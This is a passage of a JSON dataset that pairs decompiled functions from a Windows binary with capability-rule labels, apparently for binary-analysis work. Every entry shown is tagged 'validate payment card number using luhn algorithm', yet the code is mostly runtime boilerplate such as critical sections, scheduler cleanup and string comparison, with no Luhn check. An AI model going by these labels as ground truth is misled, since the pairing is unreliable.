        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t fcn.00439ac7(void)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint arg_ch;\n    uint *arg_10h;\n    uint arg_14h;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_10h = &var_4h;\n    uVar2 = 2;\n    arg_14h = 2;\n    arg_ch = 0x22;\n    iVar1 = fcn.0045b987();\n    fcn.00439ee2(*(iVar1 + 0x14), arg_ch, arg_10h, arg_14h);\n    if (var_4h != 0x30) {\n        if (var_4h == 0x31) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = (var_4h != 0x32) - 1U & 3;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 232
    },
    "00439f73": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00439f73(int32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (arg_10h != 0) {\n        arg_8h = arg_8h - arg_ch;\n        do {\n            uVar3 = *(arg_8h + arg_ch);\n            if (uVar3 - 0x41 < 0x1a) {\n                uVar3 = uVar3 + 0x20;\n            }\n            uVar1 = *arg_ch;\n            if (uVar1 - 0x41 < 0x1a) {\n                uVar1 = uVar1 + 0x20;\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (((arg_10h != 0) && (uVar3 != 0)) && (uVar3 == uVar1));\n        iVar2 = uVar3 - uVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 272
    },
    "0043d0b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d0b5(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t arg_8h_00;\n    uint var_10h;\n    \n    iVar2 = fcn.0043939a(0, 0, (arg_8h & 0xff) * 2, 0x1f0002);\n    if (iVar2 != 0) {\n        return;\n    }\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (0 < arg_8h_00) {\n        arg_8h_00 = arg_8h_00 & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h_00);\n    fcn.00451487(&var_10h, 0x48de6c);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 224
    },
    "0043e1ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e1ac(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t hThread;\n    uint32_t arg_8h;\n    uint var_10h;\n    \n    hThread = fcn.0043d662(0, 0x10000, fcn.0043f00e, param_1, 0, 0);\n    *(param_1 + 0x4c) = hThread;\n    if (hThread != 0) {\n        fcn.0043d430(hThread, 0xf);\n        return;\n    }\n    arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (0 < arg_8h) {\n        arg_8h = arg_8h & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h);\n    fcn.00451487(&var_10h, 0x48de6c);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 241
    },
    "00441f97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441f97(code **param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = vtable.Concurrency::details::SchedulerBase.0;\n    fcn.00442919(uVar1);\n    fcn.0044541e();\n    fcn.0043ac97(param_1[0x5c]);\n    fcn.0044541e();\n    fcn.0043ac97(param_1[0x59]);\n    fcn.0043c988();\n    fcn.00441e60();\n    fcn.00441eda();\n    fcn.0043ac97(param_1[0x16]);\n    fcn.0043ac97(param_1[0x14]);\n    fcn.0043ac97(param_1[0x13]);\n    fcn.0043ac97(param_1[0x11]);\n    fcn.0043ac97(param_1[0x10]);\n    fcn.0043ac97(param_1[0xe]);\n    fcn.0043ac97(param_1[0xd]);\n    fcn.004473b9();\n    *param_1 = vtable.Concurrency::Scheduler.0;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 365
    },
    "0044576d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044576d(int32_t param_1)\n\n{\n    fcn.0043ac97(*(param_1 + 0x68));\n    fcn.0043ac97(*(param_1 + 0x6c));\n    fcn.0043ac97(*(param_1 + 0xc));\n    fcn.0043ac97(*(param_1 + 0x10));\n    return;\n}\n",
        "token_count": 95
    },
    "00448340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00448340(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0xc);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -0x18) = extraout_ECX + 0x20;\n    fcn.0043cbf1();\n    uVar4 = 0;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + 0xc) != 0) {\n        do {\n            puVar2 = *(*(unaff_EBP + 8) + uVar4 * 4);\n            pcVar3 = **puVar2;\n            (**0x4742a4)();\n            (*pcVar3)();\n            fcn.004482f8(puVar2 + 2);\n            uVar4 = *(unaff_EBP + -0x14) + 1;\n            *(unaff_EBP + -0x14) = uVar4;\n        } while (uVar4 < *(unaff_EBP + 0xc));\n    }\n    pcVar3 = *(**(*(unaff_EBP + -0x10) + 8) + 0xc);\n    (**0x4742a4)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    (*pcVar3)();\n    piVar1 = *(unaff_EBP + -0x10) + 0x9c;\n    *piVar1 = *piVar1 + *(unaff_EBP + 0xc);\n    *(unaff_EBP + -4) = 1;\n    fcn.0043cd39();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 499
    },
    "004491a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004491a9(int32_t arg_8h)\n\n{\n    code **in_ECX;\n    int32_t iVar1;\n    code **ppcVar2;\n    uint var_4h;\n    \n    *in_ECX = vtable.Concurrency::details::ThreadProxyFactory_class_Concurrency::details::FreeThreadProxy_.0;\n    ppcVar2 = in_ECX + 2;\n    in_ECX[1] = *(arg_8h + 8);\n    iVar1 = 4;\n    do {\n        (*_sym.imp.KERNEL32.dll_InitializeSListHead)(ppcVar2);\n        ppcVar2 = ppcVar2 + 2;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 176
    },
    "0044b87e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0044b87e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *extraout_ECX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBP;\n    uint32_t *puVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x24);\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    uVar4 = extraout_ECX[2] * 2 + 2;\n    *(unaff_EBP + -0x20) = uVar4;\n    uVar2 = fcn.0046f837(-(uVar4 * 4 >> 0x20 != 0) | uVar4 * 4);\n    *(unaff_EBP + -0x18) = uVar2;\n    *(unaff_EBP + -0x2c) = extraout_ECX[3];\n    *(unaff_EBP + -0x30) = uVar4;\n    iVar3 = fcn.0046f837(-(uVar4 * 8 >> 0x20 != 0) | uVar4 * 8);\n    *(unaff_EBP + -0x1c) = iVar3;\n    *(unaff_EBP + -0x28) = iVar3;\n    *(unaff_EBP + -4) = 0;\n    if (iVar3 == 0) {\n        *(unaff_EBP + -0x1c) = 0;\n    }\n    else {\n        fcn.0042693c(iVar3, 8, uVar4, 0x449b2f);\n    }\n    uVar4 = extraout_ECX[5];\n    uVar6 = extraout_ECX[4];\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x30) = uVar6;\n    *(unaff_EBP + -0x28) = uVar4;\n    fcn.0043d843();\n    iVar3 = 0;\n    uVar4 = *extraout_ECX;\n    uVar6 = extraout_ECX[1] - *extraout_ECX;\n    *(unaff_EBP + -0x14) = uVar4;\n    *(unaff_EBP + -0x10) = 0;\n    puVar7 = extraout_ECX;\n    if (0 < uVar6) {\n        iVar1 = *(unaff_EBP + -0x1c);\n        do {\n            *(*(unaff_EBP + -0x18) + iVar3 * 4) = *(puVar7[3] + (uVar4 & puVar7[2]) * 4);\n            uVar4 = puVar7[4];\n            uVar5 = *(unaff_EBP + -0x14) & puVar7[2];\n            iVar3 = *(unaff_EBP + -0x10);\n            *(iVar1 + iVar3 * 8) = *(uVar4 + uVar5 * 8);\n            puVar7 = *(unaff_EBP + -0x24);\n            *(iVar1 + 4 + iVar3 * 8) = *(uVar4 + 4 + uVar5 * 8);\n            iVar3 = iVar3 + 1;\n            uVar4 = *(unaff_EBP + -0x14) + 1;\n            *(unaff_EBP + -0x10) = iVar3;\n            *(unaff_EBP + -0x14) = uVar4;\n        } while (iVar3 < uVar6);\n    }\n    fcn.00452000(*(unaff_EBP + -0x18) + uVar6 * 4, 0, (*(unaff_EBP + -0x20) - uVar6) * 4);\n    iVar3 = *(unaff_EBP + -0x20);\n    puVar7[3] = *(unaff_EBP + -0x18);\n    uVar4 = iVar3 - 1;\n    puVar7[4] = *(unaff_EBP + -0x1c);\n    iVar3 = *(unaff_EBP + 0xc);\n    *puVar7 = 0;\n    puVar7[2] = uVar4;\n    if (iVar3 == 0) {\n        uVar5 = *(unaff_EBP + 8);\n    }\n    else {\n        uVar5 = puVar7[4];\n        *(uVar5 + (uVar4 & uVar6) * 8) = iVar3;\n        *(uVar5 + 4 + (uVar4 & uVar6) * 8) = *(unaff_EBP + 0x10);\n        uVar4 = puVar7[2];\n        uVar5 = *(unaff_EBP + 8) | 1;\n    }\n    *(puVar7[3] + (uVar4 & uVar6) * 4) = uVar5;\n    puVar7[1] = uVar6 + 1;\n    *(unaff_EBP + -4) = 1;\n    fcn.0043d886();\n    fcn.0043ac97(*(unaff_EBP + -0x2c));\n    fcn.0043ac97(*(unaff_EBP + -0x30));\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 1378
    },
    "0044bc56": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bc56(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    \n    uVar1 = in_ECX[1];\n    if (uVar1 < *in_ECX + in_ECX[2]) {\n        *(in_ECX[3] + (in_ECX[2] & uVar1) * 4) = arg_8h;\n        in_ECX[1] = uVar1 + 1;\n    }\n    else {\n        fcn.0044b87e(arg_8h, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "0044ca18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ca18(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *arg_8h;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_InterlockedFlushSList)(param_1);\n    fcn.00445d80(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_InterlockedFlushSList)(param_1 + 8);\n    fcn.00445d80(uVar2);\n    fcn.00445d80(*(param_1 + 0x10));\n    arg_8h = *(param_1 + 0x30);\n    while (arg_8h != NULL) {\n        iVar3 = 0;\n        if (0 < *(param_1 + 0x28)) {\n            do {\n                fcn.004455c4(*(*arg_8h + iVar3 * 4));\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < *(param_1 + 0x28));\n        }\n        piVar1 = arg_8h[1];\n        fcn.0043ac97(*arg_8h);\n        fcn.0043a7bc(arg_8h);\n        arg_8h = piVar1;\n    }\n    fcn.0043ac97(*(param_1 + 0x34));\n    return;\n}\n",
        "token_count": 320
    },
    "0044e6b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e6b5(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x3c) = arg_8h;\n    fcn.00443ec6(fcn.0044e737, in_ECX, *(*(arg_8h + 0x100) + 4));\n    return;\n}\n",
        "token_count": 89
    },
    "0044e713": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e713(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x3c) = arg_8h;\n    fcn.00443ec6(fcn.0044e748, in_ECX, *(*(arg_8h + 0x100) + 4));\n    return;\n}\n",
        "token_count": 87
    },
    "0044e94e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044e94e(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    int32_t *in_ECX;\n    int32_t iVar6;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    if ((in_ECX[1] <= *in_ECX) && (in_ECX[0x14] <= in_ECX[0x13])) {\n        return 0;\n    }\n    piVar1 = in_ECX[0x12];\n    iVar6 = 0;\n    if ((piVar1 == NULL) || (piVar1[0x1c] < 1)) {\ncode_r0x0044e9cb:\n        iVar4 = fcn.0044acda(arg_8h);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        iVar6 = fcn.0044e8c0(arg_8h);\n        if (iVar6 == 0) {\n            return 0;\n        }\n        if ((in_ECX[0x12] != 0) && (*(*(iVar6 + 8) + 0xc) == in_ECX[0x12])) {\n            fcn.00446235(arg_8h, iVar4);\n            arg_8h_00 = 0;\n            goto code_r0x0044ea04;\n        }\n    }\n    else {\n        pcVar2 = *(*piVar1 + 0x10);\n        (**0x4742a4)();\n        cVar3 = (*pcVar2)();\n        if (cVar3 != '\\0') goto code_r0x0044e9cb;\n        if ((*(in_ECX + 0x18) == '\\0') || (iVar6 = fcn.0044e8c0(0x44e9a8),  iVar6 == 0)) {\n            iVar4 = fcn.00442d5d();\n            if (iVar4 == 0) {\n                puVar5 = 0xb3;\n            }\n            else {\n                puVar5 = iVar4 + 0xaf;\n            }\n            *puVar5 = *puVar5 | 2;\n            return iVar6;\n        }\n    }\n    arg_8h_00 = 1;\ncode_r0x0044ea04:\n    fcn.0044eb14(arg_8h_00);\n    return iVar6;\n}\n",
        "token_count": 559
    },
    "00453ffa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00453ffa(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint32_t uVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(*(arg_8h + 0x10) + 0xc);\n    uVar3 = *(*(arg_8h + 0x10) + 8);\n    uVar6 = 0;\n    if (uVar3 != 0) {\n        do {\n            piVar4 = *(iVar2 + uVar6 * 4);\n            uVar6 = uVar6 + 1;\n            if (*piVar4 == arg_10h) {\n                while( true ) {\n                    if (uVar3 <= uVar6) {\n                        return NULL;\n                    }\n                    piVar5 = *(iVar2 + uVar6 * 4);\n                    if ((*(piVar5 + 5) & 4) != 0) break;\n                    if (*piVar5 == arg_ch) {\n                        return piVar4;\n                    }\n                    uVar6 = uVar6 + 1;\n                }\n                return NULL;\n            }\n        } while (uVar6 < uVar3);\n    }\n    uVar6 = 0;\n    if (uVar3 != 0) {\n        do {\n            piVar4 = *(iVar2 + uVar6 * 4);\n            puVar7 = *piVar4 + 8;\n            puVar9 = arg_10h + 8;\n            do {\n                uVar1 = *puVar7;\n                bVar10 = uVar1 < *puVar9;\n                if (uVar1 != *puVar9) {\ncode_r0x00454082:\n                    uVar8 = -bVar10 | 1;\n                    goto code_r0x00454087;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar7[1];\n                bVar10 = uVar1 < puVar9[1];\n                if (uVar1 != puVar9[1]) goto code_r0x00454082;\n                puVar7 = puVar7 + 2;\n                puVar9 = puVar9 + 2;\n            } while (uVar1 != 0);\n            uVar8 = 0;\ncode_r0x00454087:\n            uVar6 = uVar6 + 1;\n            if (uVar8 == 0) {\n                do {\n                    if (uVar3 <= uVar6) {\n                        return NULL;\n                    }\n                    piVar5 = *(iVar2 + uVar6 * 4);\n                    if ((*(piVar5 + 5) & 4) != 0) {\n                        return NULL;\n                    }\n                    puVar7 = *piVar5 + 8;\n                    puVar9 = arg_ch + 8;\n                    do {\n                        uVar1 = *puVar7;\n                        bVar10 = uVar1 < *puVar9;\n                        if (uVar1 != *puVar9) {\ncode_r0x004540d0:\n                            uVar8 = -bVar10 | 1;\n                            goto code_r0x004540d5;\n                        }\n                        if (uVar1 == 0) break;\n                        uVar1 = puVar7[1];\n                        bVar10 = uVar1 < puVar9[1];\n                        if (uVar1 != puVar9[1]) goto code_r0x004540d0;\n                        puVar7 = puVar7 + 2;\n                        puVar9 = puVar9 + 2;\n                    } while (uVar1 != 0);\n                    uVar8 = 0;\ncode_r0x004540d5:\n                    if (uVar8 == 0) {\n                        return piVar4;\n                    }\n                    uVar6 = uVar6 + 1;\n                } while( true );\n            }\n        } while (uVar6 < uVar3);\n    }\n    return NULL;\n}\n",
        "token_count": 955
    },
    "00456489": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456489(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00455a7a(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00455cbe(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 121
    },
    "00456afa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456afa(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x495968);\n    return;\n}\n",
        "token_count": 47
    },
    "00456b42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456b42(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x495968);\n    return;\n}\n",
        "token_count": 49
    },
    "0045a085": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a085(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00456caa(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "0045a09c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a09c(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00456c19(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 46
    },
    "0045ac45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045ac45(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.0045a9c8(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 193
    },
    "0045afee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045afee(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.0045a9c8(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 227
    },
    "0045bf00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045bf00(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    \n    uVar1 = fcn.00465f05(arg_14h, 0, arg_8h, 0xffffffff, 0, 0, 0, 0);\n    if (uVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.004564f8(uVar2);\n        piVar3 = fcn.0045652e();\n        iVar4 = *piVar3;\n    }\n    else if ((uVar1 < *(arg_ch + 0xc) || uVar1 == *(arg_ch + 0xc)) || (iVar4 = fcn.0045bfe0(uVar1),  iVar4 == 0)) {\n        iVar4 = fcn.00465f05(arg_14h, 0, arg_8h, 0xffffffff, *(arg_ch + 8), *(arg_ch + 0xc), 0, 0);\n        if (iVar4 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.004564f8(uVar2);\n            piVar3 = fcn.0045652e();\n            iVar4 = *piVar3;\n        }\n        else {\n            *(arg_ch + 0x10) = iVar4;\n            iVar4 = 0;\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 372
    },
    "0045bfa7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0045bfa7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.0045bf00(arg_8h, arg_ch, &var_1h, arg_10h);\n    return;\n}\n",
        "token_count": 84
    },
    "0045c007": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045c007(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.0045bfc6();\n    iVar1 = fcn.0045c046(in_ECX + 8, arg_8h * 2);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 164
    },
    "0045e3fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045e3fb(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 43
    },
    "0045e40f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045e40f(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 44
    },
    "0045fb42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.0045fb42(int32_t **param_1)\n\n{\n    int32_t iVar1;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.004626de(1, 0xb8);\n    **param_1 = iVar1;\n    fcn.004612d2(0);\n    if (iVar1 != 0) {\n        var_20h = *param_1;\n        var_1ch = param_1[1];\n        var_18h = param_1[2];\n        var_14h = param_1[3];\n        var_10h = param_1[4];\n        var_8h = 4;\n        var_ch = 4;\n        fcn.0045fa9b(&var_ch, &var_20h);\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "00461b36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461b36(void)\n\n{\n    fcn.00461d1c(0, \"AreFileApisANSI\", 0x47b908, \"AreFileApisANSI\");\n    return;\n}\n",
        "token_count": 49
    },
    "00461b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461b50(void)\n\n{\n    fcn.00461d1c(1, \"CompareStringEx\", 0x47b91c, 0x47b924);\n    return;\n}\n",
        "token_count": 48
    },
    "00461b6a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461b6a(void)\n\n{\n    fcn.00461d1c(2, \"EnumSystemLocalesEx\", 0x47b924, \"EnumSystemLocalesEx\");\n    return;\n}\n",
        "token_count": 50
    },
    "00461b84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461b84(void)\n\n{\n    fcn.00461d1c(8, \"GetDateFormatEx\", 0x47b960, \"GetDateFormatEx\");\n    return;\n}\n",
        "token_count": 45
    },
    "00461b9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461b9e(void)\n\n{\n    fcn.00461d1c(0xb, \"GetLocaleInfoEx\", 0x47b978, 0x47b980);\n    return;\n}\n",
        "token_count": 50
    },
    "00461bb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461bb8(void)\n\n{\n    fcn.00461d1c(0xe, \"GetTimeFormatEx\", 0x47b984, \"GetTimeFormatEx\");\n    return;\n}\n",
        "token_count": 48
    },
    "00461bd2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461bd2(void)\n\n{\n    fcn.00461d1c(0xf, 0x47b9a4, 0x47b99c, 0x47b9a4);\n    return;\n}\n",
        "token_count": 55
    },
    "00461bec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
